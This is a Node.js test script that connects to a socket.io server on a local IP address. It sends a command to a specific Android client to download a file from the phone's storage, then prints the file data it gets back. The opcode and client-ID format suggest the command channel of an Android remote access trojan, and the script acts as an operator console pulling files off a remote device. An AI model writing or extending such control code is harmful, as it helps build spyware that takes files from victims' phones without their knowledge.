const io = require('socket.io-client');

const SERVER_URL = 'http://192.168.1.101:9400';

console.log('🔌 Connecting to server...');

const socket = io(SERVER_URL, {
    transports: ['polling', 'websocket']
});

socket.on('connect', () => {
    console.log('✅ Connected to server');
    
    // Send file download command (example file path)
    console.log('📤 Sending file download command...');
    socket.emit('send_command', {
        clientID: 'android_1758309836329_rl5633k45', // Replace with actual client ID
        command: {
            type: '0xFI',
            action: 'download',
            filePath: '/storage/emulated/0/Download/test.txt' // Example file path
        }
    });
    
    console.log('✅ File download command sent successfully');
    
    // Wait a bit for response
    setTimeout(() => {
        console.log('⏰ Test completed');
        process.exit(0);
    }, 15000);
});

socket.on('disconnect', () => {
    console.log('❌ Disconnected from server');
});

socket.on('connect_error', (error) => {
    console.log('❌ Connection error:', error.message);
    process.exit(1);
});

// Listen for file responses
socket.on('0xFI', (data) => {
    console.log('📁 File data received:');
    console.log('Type:', data.type);
    if (data.type === 'download') {
        console.log('File Name:', data.fileName);
        console.log('File Size:', data.fileSizeFormatted);
        console.log('File Type:', data.fileType);
        console.log('Status:', data.status);
        console.log('Buffer Length:', data.buffer ? data.buffer.length : 'No buffer');
    } else if (data.type === 'error') {
        console.log('Error:', data.error);
    } else {
        console.log('Data:', JSON.stringify(data, null, 2));
    }
});
